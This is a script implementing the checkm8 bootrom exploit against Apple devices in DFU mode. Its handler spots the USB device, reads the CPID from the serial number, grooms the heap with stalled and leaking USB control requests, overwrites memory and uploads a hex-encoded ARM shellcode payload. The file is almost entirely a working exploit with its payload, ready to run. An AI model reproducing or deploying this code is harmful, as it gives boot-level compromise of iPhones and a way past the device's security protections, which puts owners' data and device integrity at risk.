print('checkm8 started...\r\n');

// for checkm8
var exploiting = false, large_leak, leak, hole;
var buffer payload, overwrite;
var dummy = buffer_create(0xC1);

checkm8_prepare(string serial)
{
    var ptr = pointer_create(serial, 5, 1);
    var cpid;

    cpid =  ((ptr.get(0) - 0x30) * 1000)
        +   ((ptr.get(1) - 0x30) * 100)
        +   ((ptr.get(2) - 0x30) * 10)
        +   ((ptr.get(3) - 0x30) * 1);
    print('CPID: ', cpid, '\r\n');

    if (cpid == 8950) {
        large_leak = 659;
        overwrite = buffer_create(0x65C);
        memset(overwrite, 0, 0x65C);
        ptr = pointer_create(overwrite, 0x657, 1);
        ptr.set(0, 0x10);

        payload = buffer_create(676);
        payload.parse(16, '
 00 40 A0 E3 F0 40 2D E9 44 01 9F E5 D0 00 C0 E1 43 2F 8F E2 D0 40 C2 E1 F0 40 C0 E1 F0 40 C1 E1
 D8 40 C2 E1 F8 40 C0 E1 F8 40 C1 E1 D0 41 C2 E1 F0 41 C0 E1 F0 41 C1 E1 D8 41 C2 E1 F8 41 C0 E1
 F8 41 C1 E1 0C 01 9F E5 01 00 80 E2 00 10 D0 E5 00 00 51 E3 FB FF FF 1A E4 10 8F E2 00 20 91 E5
 04 30 91 E5 00 20 80 E5 04 30 80 E5 08 20 91 E5 0C 30 91 E5 08 20 80 E5 0C 30 80 E5 D4 00 9F E5
 D4 10 9F E5 D4 40 9F E5 31 FF 2F E1 00 00 C4 E5 CC 00 9F E5 9C 10 4F E2 C8 20 9F E5 02 10 81 E0
 00 20 A0 E3 C0 30 9F E5 C0 40 9F E5 09 50 80 E2 00 50 84 E5 D0 40 C1 E1 F0 40 C0 E1 D8 40 C1 E1
 F8 40 C0 E1 D0 41 C1 E1 F0 41 C0 E1 D8 41 C1 E1 F8 41 C0 E1 D0 42 C1 E1 F0 42 C0 E1 D8 42 C1 E1
 F8 42 C0 E1 D0 43 C1 E1 F0 43 C0 E1 D8 43 C1 E1 F8 43 C0 E1 3E 0F 07 EE 5F F0 7F F5 40 00 80 E2
 40 10 81 E2 40 20 82 E2 03 00 52 E1 E8 FF FF 3A 00 00 A0 E3 15 0F 07 EE 4F F0 7F F5 6F F0 7F F5
 F0 80 BD E8 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 00 00 07 21 01 0A 00 00 08 00 00 00
 00 00 00 00 20 50 57 4E 44 3A 5B 63 68 65 63 6B 6D 38 5D 00 88 19 06 10 80 1F 06 10 55 7C 00 00
 D8 00 06 10 00 98 07 10 80 01 00 00 40 01 00 00 24 1A 06 10 00 00 00 00 00 00 00 00 00 00 00 00
 DF F8 00 F0 61 81 00 00 02 88 40 F2 A1 23 9A 42 F6 D1 F0 B5 03 AF 84 B0 04 1C 3C 4D 4F F6 FF 71
 62 88 91 42 3D D1 D5 E9 00 01 39 4A 90 42 17 D1 91 42 15 D1 00 21 C5 E9 00 11 D5 E9 08 01 D5 E9
 0A 23 CD E9 00 01 CD E9 02 23 D5 E9 04 01 D5 E9 06 23 AE 68 B0 47 2F 4A C5 E9 02 01 C5 E9 00 22
 2D 4A 90 42 0D D1 91 42 0B D1 00 21 C5 E9 00 11 D5 E9 04 01 AA 69 00 F0 1D F8 26 4A C5 E9 00 22
 0F E0 26 4A 90 42 0C D1 91 42 0A D1 00 21 C5 E9 00 11 D5 E9 04 01 AA 69 00 F0 22 F8 1D 4A C5 E9
 00 22 80 20 29 1C E2 88 00 23 1D 4C A0 47 00 20 04 B0 F0 BD 04 2A 05 D3 0B 68 03 60 04 30 04 31
 04 3A F7 E7 02 2A 04 D3 0B 88 03 80 02 30 02 31 02 3A 22 B1 0B 78 03 70 01 30 01 31 01 3A 70 47
 FF 23 19 40 0B 02 19 43 0B 04 19 43 04 2A 03 D3 01 60 04 30 04 3A F9 E7 02 2A 02 D3 01 80 02 30
 02 3A 12 B1 01 70 01 30 01 3A 70 47 00 00 00 10 63 65 78 65 65 6E 6F 64 63 6D 65 6D 73 6D 65 6D
 21 76 00 00');
        return 1;
    }
    return 0;
}

checkm8_usb_req_stall(libusb_dev dev) {
    dev.transfer(0, 0, 0x02, 3, 0, 0x0080, 0, 0);
}

checkm8_usb_req_leak(libusb_dev dev) {
    dev.transfer_ex(0, 0, 0x80, 6, 0x0304, 0x040A, 64, dummy, 0x30);
}

checkm8_usb_req_no_leak(libusb_dev dev) {
    dev.transfer_ex(0, 0, 0x80, 6, 0x0304, 0x040A, 65, dummy, 0x30);
}

checkm8_stall(libusb_dev dev) {
    dev.transfer_ex(0, 0, 0x80, 6, 0x0304, 0x040A, 0xC0, dummy, 0x30);
}

checkm8_leak(libusb_dev dev) {
    dev.transfer_ex(0, 0, 0x80, 6, 0x0304, 0x040A, 0xC0, dummy, 0x30);
}

checkm8_no_leak(libusb_dev dev) {
    dev.transfer_ex(0, 0, 0x80, 6, 0x0304, 0x040A, 0xC1, dummy, 0x30);
}

libusb_get_serial_ascii(libusb_dev dev, buffer desc) {
    var realsize;
    dev.transfer(0, @realsize, 0x80, 6, 0x0304, 0x0409, desc.get_size(), desc);
    if (realsize <= 0) {
        print('fail to read serial number.\r\n');
        return 0;
    }

    // remove header and add '\0'
    var serial = buffer_create(realsize >> 1);
    var ptr_serial = pointer_create(serial, 0, 1);
    var ptr_desc = pointer_create(desc, 2, 1);
    var setial_pos = 0, desc_pos = 0;

    realsize = realsize - 2;
    while (desc_pos < realsize) {
        ptr_serial.set(setial_pos, ptr_desc.get(desc_pos));
        setial_pos = setial_pos + 1;
        desc_pos = desc_pos + 2;
    }
    return serial;
}

libusb_simple_emulate(libusb_dev dev) {
    // set address & set configuration
    var tmp_buf = buffer_create(128);
    dev .transfer(0, 0, 0x00, 5, dev.address(), 0, 0, 0)
        .transfer(0, 0, 0x80, 6, 0x0100, 0x0000, 18, tmp_buf)
        .transfer(0, 0, 0x80, 6, 0x0200, 0x0000, tmp_buf.get_size(), tmp_buf)
        .transfer(0, 0, 0x00, 9, 0x0001, 0x0000, 0, 0);
}

libusb_on_evt(evt, libusb_dev dev) {
    print('libusb_on_event(', evt, ') : ', dev, '\r\n');

    if (    (USB_EVT_ON_ARRIVED == evt)
        &&  (0x05AC == dev.vid())
        &&  (0x1227 == dev.pid())
        &&  !exploiting) {

        var desc = buffer_create(0x800);
        var i;

        var serial = libusb_get_serial_ascii(dev, desc);
        if (0 == serial) {
            return;
        }

        print(string_create(serial, 0), '\r\n');

        if (!checkm8_prepare(serial)) {
            print('iPhone not supported.\r\n');
        } else {
            print('checkm8 exploiting...\r\n');
        }

        // do exploit
        exploiting = true;

        // 1. heap feng shui
        if (large_leak > 0) {
            checkm8_usb_req_stall(dev);
            i = 0;
            while (i < large_leak) {
                checkm8_usb_req_leak(dev);
                i = i + 1;
            }
            checkm8_usb_req_no_leak(dev);
        } else {
            checkm8_stall(dev);
            i = 0;
            while (i < hole) {
                checkm8_no_leak(dev);
                i = i + 1;
            }
            checkm8_usb_req_leak(dev);
            checkm8_no_leak(dev);
        }
        dev.reset();
        delay_ms(500);

        // 2. set global state
        libusb_simple_emulate(dev);
        dev .transfer_ex(0, 0, 0x21, 1, 0, 0, 0x800, desc, 0x30)
            .transfer(0, 0, 0x21, 4, 0, 0, 0, 0)
            .reset();
        delay_ms(500);

        // 3. heap occupation
        libusb_simple_emulate(dev);
        checkm8_usb_req_stall(dev);
        if (large_leak > 0) {
            checkm8_usb_req_leak(dev);
        } else {
            i = 0;
            while (i < leak) {
                checkm8_usb_req_leak(dev);
                i = i + 1;
            }
        }
        dev.transfer(0, 0, 0, 0, 0, 0, overwrite.get_size(), overwrite);
        i = 0;
        while (i < payload.get_size()) {
            dev.transfer(0, 0, 0x21, 1, 0, 0, 0x800, payload);
            i = i + 0x800;
        }
        dev.reset();
        delay_ms(500);

        // check result
        libusb_simple_emulate(dev);
        serial = libusb_get_serial_ascii(dev, desc);
        if (0 == serial) {
            return;
        }

        print(string_create(serial, 0), '\r\n');
    }
}
libusb_start(libusb_on_evt);

var heartbeat = 0;
while (1) {
    delay_ms(1000);
    print('heart beat ', heartbeat, '\r\n');
    heartbeat = heartbeat + 1;
}
